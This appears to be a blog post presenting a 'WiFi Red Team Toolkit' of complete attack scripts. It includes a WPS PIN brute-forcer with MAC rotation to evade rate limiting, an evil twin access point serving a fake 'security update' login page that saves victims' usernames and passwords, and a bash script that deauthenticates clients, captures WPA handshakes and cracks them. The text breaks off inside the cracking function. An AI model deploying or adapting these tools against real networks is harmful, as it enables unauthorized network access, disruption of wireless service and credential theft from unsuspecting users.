---
title: "WiFi Red Team Toolkit"
description: "A collection of advanced scripts and tools for wireless penetration testing and red team operations"
pubDate: 2025-08-28
category: "tools"
tags: ["cybersecurity", "wireless", "red-team", "pentesting"]
author: "MITM.life"
difficulty: "intermediate"
readTime: "15 min"
---

# WiFi Red Team Toolkit

A collection of advanced scripts and tools for wireless penetration testing and red team operations.

## Tool 1: WiFi Reconnaissance Automation

```python
#!/usr/bin/env python3
"""
Advanced WiFi Reconnaissance Tool
Automated wireless network discovery and analysis
"""

import subprocess
import csv
import json
import time
import argparse
from pathlib import Path
from collections import defaultdict

class WiFiRecon:
    def __init__(self, interface="wlan0mon", duration=300):
        self.interface = interface
        self.duration = duration
        self.networks = []
        self.clients = []
        
    def enable_monitor_mode(self):
        """Enable monitor mode on wireless interface"""
        try:
            # Kill processes that might interfere
            subprocess.run(['airmon-ng', 'check', 'kill'], capture_output=True)
            
            # Enable monitor mode
            result = subprocess.run(['airmon-ng', 'start', self.interface.replace('mon', '')], 
                                  capture_output=True, text=True)
            
            if 'monitor mode enabled' in result.stdout:
                print(f"[+] Monitor mode enabled on {self.interface}")
                return True
            else:
                print(f"[-] Failed to enable monitor mode")
                return False
                
        except Exception as e:
            print(f"[-] Error enabling monitor mode: {e}")
            return False
    
    def scan_networks(self):
        """Perform comprehensive network scan"""
        print(f"[+] Starting {self.duration}s wireless scan...")
        
        timestamp = int(time.time())
        output_file = f"recon_{timestamp}"
        
        # Start airodump-ng scan
        cmd = [
            'timeout', str(self.duration),
            'airodump-ng', 
            '--write', output_file,
            '--output-format', 'csv',
            '--manufacturer',
            self.interface
        ]
        
        try:
            subprocess.run(cmd, check=True)
            
            # Parse CSV results
            csv_file = f"{output_file}-01.csv"
            if Path(csv_file).exists():
                self.parse_results(csv_file)
                return True
            else:
                print(f"[-] No scan results found")
                return False
                
        except subprocess.CalledProcessError as e:
            print(f"[-] Scan failed: {e}")
            return False
    
    def parse_results(self, csv_file):
        """Parse airodump CSV output"""
        with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
            
        # Split networks and clients sections
        sections = content.split('\n\n')
        
        # Parse networks
        network_lines = sections[0].strip().split('\n')[1:]  # Skip header
        for line in network_lines:
            if line.strip():
                fields = [field.strip() for field in line.split(',')]
                if len(fields) >= 14 and fields[0]:  # Valid BSSID
                    network = {
                        'bssid': fields[0],
                        'first_seen': fields[1],
                        'last_seen': fields[2],
                        'channel': fields[3],
                        'speed': fields[4],
                        'privacy': fields[5],
                        'cipher': fields[6],
                        'authentication': fields[7],
                        'power': int(fields[8]) if fields[8].strip() != '' else -100,
                        'beacons': int(fields[9]) if fields[9].strip() != '' else 0,
                        'iv': int(fields[10]) if fields[10].strip() != '' else 0,
                        'lan_ip': fields[11],
                        'id_length': fields[12],
                        'essid': fields[13],
                        'key': fields[14] if len(fields) > 14 else ''
                    }
                    self.networks.append(network)
        
        # Parse clients if available
        if len(sections) > 1:
            client_lines = sections[1].strip().split('\n')[1:]  # Skip header
            for line in client_lines:
                if line.strip():
                    fields = [field.strip() for field in line.split(',')]
                    if len(fields) >= 6 and fields[0]:  # Valid client MAC
                        client = {
                            'client_mac': fields[0],
                            'first_seen': fields[1],
                            'last_seen': fields[2],
                            'power': int(fields[3]) if fields[3].strip() != '' else -100,
                            'packets': int(fields[4]) if fields[4].strip() != '' else 0,
                            'bssid': fields[5],
                            'probed_essids': fields[6] if len(fields) > 6 else ''
                        }
                        self.clients.append(client)
    
    def analyze_networks(self):
        """Analyze discovered networks for red team insights"""
        analysis = {
            'total_networks': len(self.networks),
            'total_clients': len(self.clients),
            'vulnerable_networks': [],
            'high_value_targets': [],
            'hidden_networks': [],
            'wps_enabled': [],
            'weak_encryption': [],
            'enterprise_networks': []
        }
        
        for network in self.networks:
            # Vulnerable networks (WEP, Open, WPS)
            if 'WEP' in network['privacy'] or network['privacy'] == 'OPN':
                analysis['vulnerable_networks'].append(network)
            
            # WPS enabled
            if 'WPS' in network['privacy']:
                analysis['wps_enabled'].append(network)
            
            # Hidden networks
            if not network['essid'] or network['essid'].strip() == '':
                analysis['hidden_networks'].append(network)
            
            # High signal strength (close targets)
            if network['power'] > -50:
                analysis['high_value_targets'].append(network)
            
            # Enterprise networks (802.1X)
            if 'MGT' in network['privacy']:
                analysis['enterprise_networks'].append(network)
        
        # Sort lists by signal strength
        for key in ['vulnerable_networks', 'high_value_targets', 'wps_enabled']:
            analysis[key].sort(key=lambda x: x['power'], reverse=True)
        
        return analysis
    
    def generate_report(self, analysis):
        """Generate comprehensive reconnaissance report"""
        print("\n" + "="*60)
        print("           WiFi RECONNAISSANCE REPORT")
        print("="*60)
        
        print(f"\nSUMMARY:")
        print(f"  Networks Discovered: {analysis['total_networks']}")
        print(f"  Active Clients: {analysis['total_clients']}")
        print(f"  Vulnerable Networks: {len(analysis['vulnerable_networks'])}")
        print(f"  WPS Enabled: {len(analysis['wps_enabled'])}")
        print(f"  Hidden Networks: {len(analysis['hidden_networks'])}")
        
        if analysis['vulnerable_networks']:
            print(f"\nVULNERABLE NETWORKS (Top 5):")
            for i, net in enumerate(analysis['vulnerable_networks'][:5], 1):
                print(f"  {i}. {net['essid'] or '[Hidden]'} ({net['bssid']})")
                print(f"     Channel: {net['channel']}, Power: {net['power']} dBm")
                print(f"     Security: {net['privacy']}")
        
        if analysis['wps_enabled']:
            print(f"\nWPS ENABLED NETWORKS:")
            for net in analysis['wps_enabled'][:5]:
                print(f"  • {net['essid'] or '[Hidden]'} ({net['bssid']})")
                print(f"    Channel: {net['channel']}, Power: {net['power']} dBm")
        
        if analysis['high_value_targets']:
            print(f"\nHIGH-VALUE TARGETS (Strong Signal):")
            for net in analysis['high_value_targets'][:5]:
                print(f"  • {net['essid'] or '[Hidden]'} ({net['bssid']})")
                print(f"    Channel: {net['channel']}, Power: {net['power']} dBm")
                print(f"    Security: {net['privacy']}")
        
        # Client analysis
        client_networks = defaultdict(list)
        for client in self.clients:
            if client['bssid'] and client['bssid'] != '(not associated)':
                client_networks[client['bssid']].append(client)
        
        if client_networks:
            print(f"\nNETWORKS WITH ACTIVE CLIENTS:")
            for bssid, clients in list(client_networks.items())[:5]:
                # Find network name
                network_name = next((n['essid'] for n in self.networks if n['bssid'] == bssid), 'Unknown')
                print(f"  • {network_name} ({bssid}): {len(clients)} clients")
        
        return analysis
    
    def save_results(self, analysis, format='json'):
        """Save results to file"""
        timestamp = int(time.time())
        
        if format == 'json':
            filename = f"wifi_recon_{timestamp}.json"
            with open(filename, 'w') as f:
                json.dump({
                    'networks': self.networks,
                    'clients': self.clients,
                    'analysis': analysis
                }, f, indent=2)
            print(f"\n[+] Results saved to {filename}")
        
        elif format == 'csv':
            filename = f"wifi_networks_{timestamp}.csv"
            with open(filename, 'w', newline='') as f:
                writer = csv.DictWriter(f, fieldnames=self.networks[0].keys())
                writer.writeheader()
                writer.writerows(self.networks)
            print(f"\n[+] Networks saved to {filename}")

def main():
    parser = argparse.ArgumentParser(description='Advanced WiFi Reconnaissance Tool')
    parser.add_argument('-i', '--interface', default='wlan0mon', 
                       help='Wireless interface in monitor mode')
    parser.add_argument('-d', '--duration', type=int, default=300,
                       help='Scan duration in seconds (default: 300)')
    parser.add_argument('-f', '--format', choices=['json', 'csv'], default='json',
                       help='Output format')
    
    args = parser.parse_args()
    
    # Initialize reconnaissance
    recon = WiFiRecon(args.interface, args.duration)
    
    # Enable monitor mode
    if not recon.enable_monitor_mode():
        return
    
    # Perform scan
    if not recon.scan_networks():
        return
    
    # Analyze results
    analysis = recon.analyze_networks()
    
    # Generate report
    recon.generate_report(analysis)
    
    # Save results
    recon.save_results(analysis, args.format)

if __name__ == "__main__":
    main()
```

## Tool 2: Automated WPS Attack Framework

```python
#!/usr/bin/env python3
"""
Automated WPS Attack Framework
Advanced WPS PIN brute force with rate limiting bypass
"""

import subprocess
import time
import random
import re
import argparse
from threading import Thread, Event

class WPSAttacker:
    def __init__(self, interface="wlan0mon"):
        self.interface = interface
        self.attack_stop = Event()
        self.current_mac = None
        
    def get_mac_address(self):
        """Get current MAC address"""
        result = subprocess.run(['ifconfig', self.interface], 
                              capture_output=True, text=True)
        mac_match = re.search(r'ether\s+([0-9a-f:]+)', result.stdout)
        return mac_match.group(1) if mac_match else None
    
    def change_mac_address(self):
        """Change MAC address to bypass rate limiting"""
        # Generate random MAC (locally administered)
        mac = "02:00:00:%02x:%02x:%02x" % (
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255)
        )
        
        try:
            subprocess.run(['ifconfig', self.interface, 'down'], check=True)
            subprocess.run(['ifconfig', self.interface, 'hw', 'ether', mac], check=True)
            subprocess.run(['ifconfig', self.interface, 'up'], check=True)
            
            self.current_mac = mac
            print(f"[+] MAC changed to: {mac}")
            return True
            
        except subprocess.CalledProcessError:
            print(f"[-] Failed to change MAC address")
            return False
    
    def scan_wps_networks(self):
        """Scan for WPS-enabled networks"""
        print("[+] Scanning for WPS-enabled networks...")
        
        try:
            result = subprocess.run(['wash', '-i', self.interface], 
                                  capture_output=True, text=True, timeout=30)
            
            networks = []
            for line in result.stdout.split('\n')[2:]:  # Skip header
                if line.strip():
                    parts = line.split()
                    if len(parts) >= 6:
                        network = {
                            'bssid': parts[0],
                            'channel': parts[1],
                            'rssi': parts[2],
                            'wps_version': parts[3],
                            'wps_locked': parts[4],
                            'essid': ' '.join(parts[6:]) if len(parts) > 6 else ''
                        }
                        networks.append(network)
            
            return networks
            
        except subprocess.TimeoutExpired:
            print("[-] WPS scan timeout")
            return []
        except Exception as e:
            print(f"[-] WPS scan error: {e}")
            return []
    
    def reaver_attack(self, bssid, channel, pin_range=None):
        """Execute Reaver WPS attack"""
        cmd = [
            'reaver', '-i', self.interface,
            '-b', bssid, '-c', channel,
            '-vv', '-L', '-N', '-d', '15', '-T', '0.5', '-r', '3:15'
        ]
        
        if pin_range:
            cmd.extend(['-s', str(pin_range[0]), '-e', str(pin_range[1])])
        
        try:
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, 
                                     stderr=subprocess.STDOUT, text=True)
            
            while not self.attack_stop.is_set():
                output = process.stdout.readline()
                if output:
                    print(output.strip())
                    
                    # Check for success
                    if 'WPS PIN found' in output:
                        pin_match = re.search(r'WPS PIN found: (\d+)', output)
                        if pin_match:
                            return pin_match.group(1)
                    
                    # Check for rate limiting
                    if 'WARNING: Detected AP rate limiting' in output:
                        print("[!] Rate limiting detected, changing MAC...")
                        process.terminate()
                        return 'RATE_LIMITED'
                    
                    # Check for locked AP
                    if 'WPS lock engaged' in output:
                        print("[!] WPS locked")
                        process.terminate()
                        return 'LOCKED'
                
                if process.poll() is not None:
                    break
            
            process.terminate()
            return None
            
        except Exception as e:
            print(f"[-] Reaver attack error: {e}")
            return None
    
    def pixie_dust_attack(self, bssid, channel):
        """Execute Pixie Dust attack (faster WPS attack)"""
        print(f"[+] Attempting Pixie Dust attack on {bssid}")
        
        cmd = [
            'reaver', '-i', self.interface,
            '-b', bssid, '-c', channel,
            '-K', '1', '-vv'
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            
            if 'WPS PIN found' in result.stdout:
                pin_match = re.search(r'WPS PIN found: (\d+)', result.stdout)
                if pin_match:
                    return pin_match.group(1)
            
            return None
            
        except subprocess.TimeoutExpired:
            print("[-] Pixie Dust attack timeout")
            return None
        except Exception as e:
            print(f"[-] Pixie Dust attack error: {e}")
            return None
    
    def comprehensive_wps_attack(self, target):
        """Comprehensive WPS attack with multiple techniques"""
        bssid = target['bssid']
        channel = target['channel']
        essid = target['essid']
        
        print(f"\n[+] Attacking: {essid} ({bssid}) on channel {channel}")
        
        # Step 1: Pixie Dust attack (fast)
        print("[+] Trying Pixie Dust attack...")
        pin = self.pixie_dust_attack(bssid, channel)
        if pin:
            print(f"[+] SUCCESS! WPS PIN found via Pixie Dust: {pin}")
            return pin
        
        # Step 2: Regular brute force with MAC rotation
        print("[+] Falling back to brute force attack with MAC rotation...")
        
        max_attempts = 100
        attempts = 0
        
        while attempts < max_attempts and not self.attack_stop.is_set():
            # Change MAC every 10 attempts
            if attempts % 10 == 0:
                self.change_mac_address()
                time.sleep(5)  # Let interface settle
            
            print(f"[+] Attempt {attempts + 1}/{max_attempts}")
            
            # Try 10 PINs before MAC rotation
            result = self.reaver_attack(bssid, channel)
            
            if result and result not in ['RATE_LIMITED', 'LOCKED']:
                print(f"[+] SUCCESS! WPS PIN found: {result}")
                return result
            elif result == 'LOCKED':
                print(f"[-] AP {bssid} is locked, moving to next target")
                break
            elif result == 'RATE_LIMITED':
                print("[!] Rate limiting detected despite MAC change")
                time.sleep(60)  # Wait before retry
            
            attempts += 10
            
            # Cool down between attempts
            if not self.attack_stop.is_set():
                time.sleep(30)
        
        print(f"[-] Attack on {bssid} unsuccessful")
        return None
    
    def attack_all_wps_networks(self):
        """Attack all discovered WPS networks"""
        networks = self.scan_wps_networks()
        
        if not networks:
            print("[-] No WPS-enabled networks found")
            return
        
        print(f"[+] Found {len(networks)} WPS-enabled networks")
        
        # Sort by signal strength (closer = higher priority)
        networks.sort(key=lambda x: int(x['rssi']), reverse=True)
        
        successful_attacks = []
        
        for network in networks:
            if self.attack_stop.is_set():
                break
            
            if network['wps_locked'] == 'Yes':
                print(f"[-] Skipping locked network: {network['essid']} ({network['bssid']})")
                continue
            
            pin = self.comprehensive_wps_attack(network)
            if pin:
                successful_attacks.append({
                    'network': network,
                    'pin': pin
                })
        
        # Report results
        print("\n" + "="*50)
        print("WPS ATTACK RESULTS")
        print("="*50)
        
        if successful_attacks:
            print(f"[+] Successfully cracked {len(successful_attacks)} networks:")
            for attack in successful_attacks:
                net = attack['network']
                print(f"  • {net['essid']} ({net['bssid']})")
                print(f"    WPS PIN: {attack['pin']}")
        else:
            print("[-] No networks successfully cracked")
    
    def stop_attack(self):
        """Stop ongoing attacks"""
        self.attack_stop.set()

def main():
    parser = argparse.ArgumentParser(description='Automated WPS Attack Framework')
    parser.add_argument('-i', '--interface', default='wlan0mon',
                       help='Wireless interface in monitor mode')
    parser.add_argument('-t', '--target', 
                       help='Target BSSID (if not specified, attacks all WPS networks)')
    parser.add_argument('-c', '--channel',
                       help='Target channel (required with -t)')
    
    args = parser.parse_args()
    
    attacker = WPSAttacker(args.interface)
    
    try:
        if args.target:
            if not args.channel:
                print("[-] Channel required when targeting specific BSSID")
                return
            
            target = {
                'bssid': args.target,
                'channel': args.channel,
                'essid': 'Target Network',
                'wps_locked': 'No'
            }
            
            attacker.comprehensive_wps_attack(target)
        else:
            attacker.attack_all_wps_networks()
    
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
        attacker.stop_attack()

if __name__ == "__main__":
    main()
```

## Tool 3: Evil Twin AP with Credential Harvesting

```python
#!/usr/bin/env python3
"""
Evil Twin Access Point with Credential Harvesting
Complete solution for WiFi credential harvesting
"""

import subprocess
import os
import time
import signal
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler
from threading import Thread
import json

class CredentialHarvester(BaseHTTPRequestHandler):
    def do_GET(self):
        """Serve captive portal page"""
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            portal_html = """
<!DOCTYPE html>
<html>
<head>
    <title>WiFi Login - Security Update Required</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            margin: 0;
            padding: 20px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
            max-width: 400px;
            width: 100%;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .shield {
            width: 60px;
            height: 60px;
            background: #4285f4;
            border-radius: 50%;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 24px;
            margin-bottom: 10px;
        }
        h1 {
            color: #333;
            text-align: center;
            margin-bottom: 10px;
            font-size: 24px;
        }
        .warning {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            color: #856404;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-size: 14px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 500;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px;
            border: 2px solid #e1e1e1;
            border-radius: 6px;
            font-size: 16px;
            transition: border-color 0.3s;
            box-sizing: border-box;
        }
        input:focus {
            outline: none;
            border-color: #4285f4;
        }
        .submit-btn {
            width: 100%;
            padding: 14px;
            background: #4285f4;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.3s;
        }
        .submit-btn:hover {
            background: #3367d6;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            color: #666;
            font-size: 12px;
        }
        .progress {
            display: none;
            text-align: center;
            color: #4285f4;
            margin-top: 15px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <div class="shield">🔒</div>
            <h1>WiFi Security Update</h1>
        </div>
        
        <div class="warning">
            <strong>⚠️ Security Update Required</strong><br>
            Your device needs a security update to connect to this network.
            Please verify your credentials to download the required patch.
        </div>
        
        <form id="loginForm" onsubmit="submitCredentials(event)">
            <div class="form-group">
                <label for="username">Username or Email:</label>
                <input type="text" id="username" name="username" required 
                       placeholder="Enter your username">
            </div>
            
            <div class="form-group">
                <label for="password">Password:</label>
                <input type="password" id="password" name="password" required 
                       placeholder="Enter your password">
            </div>
            
            <button type="submit" class="submit-btn">
                Download Security Update
            </button>
            
            <div class="progress" id="progress">
                <div>🔄 Downloading security update...</div>
            </div>
        </form>
        
        <div class="footer">
            This security update is required by IT policy.<br>
            Your credentials are encrypted and secure.
        </div>
    </div>
    
    <script>
        function submitCredentials(event) {
            event.preventDefault();
            
            const form = document.getElementById('loginForm');
            const progress = document.getElementById('progress');
            const submitBtn = form.querySelector('.submit-btn');
            
            // Show progress
            progress.style.display = 'block';
            submitBtn.disabled = true;
            submitBtn.textContent = 'Processing...';
            
            // Collect form data
            const formData = new FormData(form);
            
            // Submit credentials
            fetch('/submit', {
                method: 'POST',
                body: formData
            }).then(() => {
                // Simulate download
                setTimeout(() => {
                    progress.innerHTML = '<div style="color: green;">✓ Security update installed successfully!</div>';
                    setTimeout(() => {
                        window.location.href = 'https://google.com';
                    }, 2000);
                }, 3000);
            });
        }
    </script>
</body>
</html>
            """
            self.wfile.write(portal_html.encode())
        
        else:
            # Redirect everything to portal
            self.send_response(302)
            self.send_header('Location', 'http://192.168.1.1/')
            self.end_headers()
    
    def do_POST(self):
        """Handle credential submission"""
        if self.path == '/submit':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            
            # Parse credentials
            credentials = {}
            for param in post_data.split('&'):
                if '=' in param:
                    key, value = param.split('=', 1)
                    credentials[key] = value.replace('+', ' ').replace('%40', '@')
            
            # Log credentials
            timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
            client_ip = self.client_address[0]
            
            log_entry = {
                'timestamp': timestamp,
                'client_ip': client_ip,
                'username': credentials.get('username', ''),
                'password': credentials.get('password', ''),
                'user_agent': self.headers.get('User-Agent', '')
            }
            
            # Save to file
            with open('harvested_credentials.json', 'a') as f:
                f.write(json.dumps(log_entry) + '\n')
            
            print(f"[+] Credentials captured from {client_ip}:")
            print(f"    Username: {credentials.get('username', '')}")
            print(f"    Password: {credentials.get('password', '')}")
            
            # Respond to client
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'OK')
    
    def log_message(self, format, *args):
        """Suppress HTTP server logs"""
        pass

class EvilTwinAP:
    def __init__(self, interface, target_ssid):
        self.interface = interface
        self.target_ssid = target_ssid
        self.processes = []
        
    def setup_interfaces(self):
        """Setup network interfaces"""
        print("[+] Setting up network interfaces...")
        
        try:
            # Create virtual interface for AP
            subprocess.run(['iw', 'dev', self.interface, 'interface', 'add', 'ap0', 'type', '__ap'])
            
            # Configure IP address
            subprocess.run(['ifconfig', 'ap0', '192.168.1.1', 'netmask', '255.255.255.0'])
            subprocess.run(['ifconfig', 'ap0', 'up'])
            
            print("[+] Interfaces configured")
            return True
            
        except Exception as e:
            print(f"[-] Interface setup failed: {e}")
            return False
    
    def create_hostapd_config(self):
        """Create hostapd configuration"""
        config = f"""
interface=ap0
driver=nl80211
ssid={self.target_ssid}
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=password123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
"""
        
        with open('/tmp/hostapd.conf', 'w') as f:
            f.write(config)
        
        return '/tmp/hostapd.conf'
    
    def create_dnsmasq_config(self):
        """Create dnsmasq configuration"""
        config = """
interface=ap0
dhcp-range=192.168.1.10,192.168.1.50,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
address=/#/192.168.1.1
"""
        
        with open('/tmp/dnsmasq.conf', 'w') as f:
            f.write(config)
        
        return '/tmp/dnsmasq.conf'
    
    def setup_iptables(self):
        """Setup iptables for captive portal"""
        print("[+] Setting up iptables rules...")
        
        commands = [
            # Enable IP forwarding
            'echo 1 > /proc/sys/net/ipv4/ip_forward',
            
            # Flush existing rules
            'iptables -F',
            'iptables -X',
            'iptables -t nat -F',
            'iptables -t nat -X',
            
            # Redirect HTTP traffic to captive portal
            'iptables -t nat -A PREROUTING -i ap0 -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:8080',
            'iptables -t nat -A PREROUTING -i ap0 -p tcp --dport 443 -j DNAT --to-destination 192.168.1.1:8080',
            
            # Allow traffic to/from AP
            'iptables -A FORWARD -i ap0 -o eth0 -j ACCEPT',
            'iptables -A FORWARD -i eth0 -o ap0 -m state --state RELATED,ESTABLISHED -j ACCEPT',
            'iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE'
        ]
        
        for cmd in commands:
            subprocess.run(cmd, shell=True)
    
    def start_services(self):
        """Start hostapd and dnsmasq"""
        print("[+] Starting evil twin services...")
        
        # Start hostapd
        hostapd_config = self.create_hostapd_config()
        hostapd_proc = subprocess.Popen(['hostapd', hostapd_config])
        self.processes.append(hostapd_proc)
        
        time.sleep(2)
        
        # Start dnsmasq
        dnsmasq_config = self.create_dnsmasq_config()
        dnsmasq_proc = subprocess.Popen(['dnsmasq', '-C', dnsmasq_config, '--no-daemon'])
        self.processes.append(dnsmasq_proc)
        
        time.sleep(1)
        
        # Start credential harvester
        print("[+] Starting credential harvester on port 8080...")
        httpd = HTTPServer(('192.168.1.1', 8080), CredentialHarvester)
        
        def run_server():
            httpd.serve_forever()
        
        server_thread = Thread(target=run_server)
        server_thread.daemon = True
        server_thread.start()
        
        return True
    
    def cleanup(self):
        """Cleanup processes and interfaces"""
        print("\n[+] Cleaning up...")
        
        # Kill processes
        for proc in self.processes:
            proc.terminate()
        
        # Remove virtual interface
        try:
            subprocess.run(['iw', 'dev', 'ap0', 'del'])
        except:
            pass
        
        # Flush iptables
        subprocess.run(['iptables', '-F'], stderr=subprocess.DEVNULL)
        subprocess.run(['iptables', '-X'], stderr=subprocess.DEVNULL)
        subprocess.run(['iptables', '-t', 'nat', '-F'], stderr=subprocess.DEVNULL)
        subprocess.run(['iptables', '-t', 'nat', '-X'], stderr=subprocess.DEVNULL)
    
    def run(self):
        """Run evil twin attack"""
        print(f"[+] Starting Evil Twin AP: {self.target_ssid}")
        
        if not self.setup_interfaces():
            return
        
        self.setup_iptables()
        
        if not self.start_services():
            return
        
        print(f"[+] Evil Twin AP '{self.target_ssid}' is running")
        print("[+] Credential harvester active on http://192.168.1.1:8080")
        print("[+] Captured credentials will be saved to 'harvested_credentials.json'")
        print("[+] Press Ctrl+C to stop")
        
        try:
            # Keep running
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            self.cleanup()

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='Evil Twin AP with Credential Harvesting')
    parser.add_argument('-i', '--interface', required=True,
                       help='Wireless interface (must support AP mode)')
    parser.add_argument('-s', '--ssid', required=True,
                       help='Target SSID to clone')
    
    args = parser.parse_args()
    
    if os.geteuid() != 0:
        print("[-] This script must be run as root")
        return
    
    evil_twin = EvilTwinAP(args.interface, args.ssid)
    evil_twin.run()

if __name__ == "__main__":
    main()
```

## Tool 4: WiFi Handshake Automation

```bash
#!/bin/bash

# WiFi Handshake Capture Automation Script
# Automatically captures WPA handshakes from multiple targets

INTERFACE="wlan0mon"
WORDLIST="/usr/share/wordlists/rockyou.txt"
TIMEOUT=300  # 5 minutes per target

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

print_banner() {
    echo -e "${BLUE}"
    echo "================================================"
    echo "    WiFi Handshake Capture Automation"
    echo "================================================"
    echo -e "${NC}"
}

check_dependencies() {
    echo -e "${YELLOW}[+] Checking dependencies...${NC}"
    
    local deps=("airmon-ng" "airodump-ng" "aireplay-ng" "aircrack-ng" "hashcat")
    
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            echo -e "${RED}[-] $dep not found${NC}"
            exit 1
        fi
    done
    
    echo -e "${GREEN}[+] All dependencies found${NC}"
}

enable_monitor_mode() {
    echo -e "${YELLOW}[+] Enabling monitor mode on $INTERFACE...${NC}"
    
    # Kill interfering processes
    airmon-ng check kill > /dev/null 2>&1
    
    # Enable monitor mode
    airmon-ng start "${INTERFACE%mon}" > /dev/null 2>&1
    
    if iwconfig "$INTERFACE" 2>/dev/null | grep -q "Mode:Monitor"; then
        echo -e "${GREEN}[+] Monitor mode enabled${NC}"
        return 0
    else
        echo -e "${RED}[-] Failed to enable monitor mode${NC}"
        return 1
    fi
}

scan_networks() {
    echo -e "${YELLOW}[+] Scanning for WPA networks (60 seconds)...${NC}"
    
    local scan_file="scan_$(date +%s)"
    
    # Background scan
    timeout 60 airodump-ng "$INTERFACE" --write "$scan_file" --output-format csv > /dev/null 2>&1
    
    # Parse results
    if [[ -f "${scan_file}-01.csv" ]]; then
        # Extract WPA networks with clients
        awk -F',' '
        /WPA/ && $9 != "" && $9 > -70 {
            gsub(/^ +| +$/, "", $14);  # Trim ESSID
            if ($14 != "") {
                printf "%s,%s,%s,%s\n", $1, $4, $9, $14;
            }
        }' "${scan_file}-01.csv" | head -10 > networks.tmp
        
        rm -f "${scan_file}-01.csv" "${scan_file}-01.kismet.csv"
        
        if [[ -s networks.tmp ]]; then
            echo -e "${GREEN}[+] Found WPA networks:${NC}"
            echo "BSSID                  Channel  Power  ESSID"
            echo "================================================"
            
            while IFS=',' read -r bssid channel power essid; do
                printf "%-17s  %-7s  %-5s  %s\n" "$bssid" "$channel" "$power" "$essid"
            done < networks.tmp
            
            return 0
        else
            echo -e "${RED}[-] No suitable WPA networks found${NC}"
            return 1
        fi
    else
        echo -e "${RED}[-] Scan failed${NC}"
        return 1
    fi
}

capture_handshake() {
    local bssid="$1"
    local channel="$2"
    local essid="$3"
    local output_file="handshake_$(echo "$bssid" | tr ':' '_')"
    
    echo -e "${YELLOW}[+] Capturing handshake for $essid ($bssid)...${NC}"
    
    # Start capture in background
    airodump-ng -c "$channel" --bssid "$bssid" -w "$output_file" "$INTERFACE" > /dev/null 2>&1 &
    local capture_pid=$!
    
    sleep 5
    
    # Send deauth packets
    echo -e "${YELLOW}[+] Sending deauth packets...${NC}"
    for i in {1..5}; do
        aireplay-ng -0 5 -a "$bssid" "$INTERFACE" > /dev/null 2>&1
        sleep 2
    done
    
    # Wait for handshake
    local elapsed=0
    local handshake_found=false
    
    while [[ $elapsed -lt 60 ]]; do
        if [[ -f "${output_file}-01.cap" ]]; then
            if aircrack-ng "${output_file}-01.cap" 2>/dev/null | grep -q "1 handshake"; then
                handshake_found=true
                break
            fi
        fi
        
        sleep 5
        elapsed=$((elapsed + 5))
    done
    
    # Kill capture process
    kill $capture_pid > /dev/null 2>&1
    
    if [[ "$handshake_found" == true ]]; then
        echo -e "${GREEN}[+] Handshake captured for $essid${NC}"
        
        # Convert to hashcat format
        hcxpcaptool -z "${output_file}.hc22000" "${output_file}-01.cap" > /dev/null 2>&1
        
        return 0
    else
        echo -e "${RED}[-] Failed to capture handshake for $essid${NC}"
        rm -f "${output_file}-01.cap"
        return 1
    fi
}

crack_handshakes() {
    echo -e "${YELLOW}[+] Starting handshake cracking...${NC}"
    
    local handshake_files=(*.hc22000)
    
    if [[ ${#handshake_files[@]} -eq 0 ]] || [[ ! -f "${handshake_files[0]}" ]]; then
        echo -e "${RED}[-] No handshake files found${NC}"
        return 1
    fi
    
    if [[ ! -f "$WORDLIST" ]]; then
        echo -e "${RED}[-] Wordlist not found: $WORDLIST${NC}"
        return 1
    fi
    
    for handshake_file in "${handshake_files[@]}"; do
        echo -e "${YELLOW}[+] Cracking $handshake_file...${NC}"
        
        # Try hashcat first (if available and GPU present)
        if command -v hashcat &> /dev/null; then
            timeout 300 hashcat -m 22000 "$handshake_file" "$WORDLIST" --quiet --potfile-disable --outfile="${handshake_file}.cracked" --outfile-format=2
            
            if [[ -f "${handshake_file}.cracked" ]]; then
                local password
                password=$(cat "${handshake_file}.cracked")
                echo -e "${GREEN}[+] Password found: $password${NC}"
                echo "$handshake_file:$password" >> cracked_passwords.txt
                continue
            fi
        fi
        
